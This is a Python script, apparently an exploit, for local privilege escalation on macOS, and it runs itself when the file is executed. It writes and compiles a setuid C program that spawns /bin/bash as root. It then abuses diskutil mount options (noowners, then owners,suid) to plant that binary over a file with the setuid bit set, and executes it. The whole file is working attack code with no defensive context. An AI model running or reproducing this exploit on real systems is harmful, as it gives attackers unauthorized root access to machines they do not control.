import os
import subprocess
import tempfile

# Define file paths in the current directory
current_directory = os.getcwd()
payload_source_path = os.path.join(current_directory, "suidshell.c")
payload_binary_path = os.path.join(current_directory, "suidshell")
target_file_path = os.path.join(current_directory, ".file")  # Target file in current directory
disk_identifier = "/dev/disk3s4"

# Function to execute commands and handle errors
def execute_command(command):
    process = subprocess.run(command, shell=True, capture_output=True, text=True, check=False)
    if process.returncode != 0:
        print(f"Error executing command: {command}")
        print(f"Stdout: {process.stdout}")
        print(f"Stderr: {process.stderr}")
        return False
    return True

# Function to create setuid shell payload
def create_payload():
    payload_content = """
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>  // Include stdlib.h for the system() function

int main() {
    setuid(0);
    system("/bin/bash");
    return 0;
}
"""
    with open(payload_source_path, "w") as f:
        f.write(payload_content)
    compile_command = f"gcc {payload_source_path} -o {payload_binary_path}"
    chmod_command = f"chmod +s {payload_binary_path}"
    if not execute_command(compile_command) or not execute_command(chmod_command):
        print("Error creating payload.")
        return False
    return True

# Function to mount filesystem with "noowners" flag
def mount_filesystem():
    mount_command = f"diskutil mount -mountOptions noowners {disk_identifier}"
    return execute_command(mount_command)

# Function to make .file writable
def modify_file_permissions():
    chmod_command = f"chmod 777 {target_file_path}"
    return execute_command(chmod_command)

# Function to copy setuid shell binary into .file
def copy_payload():
    cp_command = f"cp {payload_binary_path} {target_file_path}"
    return execute_command(cp_command)

# Function to set permissions and setuid bit for .file
def set_file_permissions():
    chmod_command = f"chmod +sx {target_file_path}"
    return execute_command(chmod_command)

# Function to remount filesystem in "owners" and "suid" mode
def remount_filesystem():
    remount_command = f"diskutil mount -mountOptions owners,suid {disk_identifier}"
    return execute_command(remount_command)

# Function to execute setuid shell
def execute_payload():
    return execute_command(target_file_path)

# Main function to execute exploit
def exploit():
    try:
        # Step 1: Create setuid shell payload
        if not create_payload():
            return

        # Step 2: Mount filesystem with "noowners" flag
        if not mount_filesystem():
            return

        # Step 3: Make .file writable
        if not modify_file_permissions():
            return

        # Step 4: Copy setuid shell binary into .file
        if not copy_payload():
            return

        # Step 5: Set permissions and setuid bit for .file
        if not set_file_permissions():
            return

        # Step 6: Remount filesystem in "owners" and "suid" mode
        if not remount_filesystem():
            return

        # Step 7: Execute setuid shell
        execute_payload()

    except Exception as e:
        print(f"Error executing exploit: {e}")

# Execute exploit
exploit()
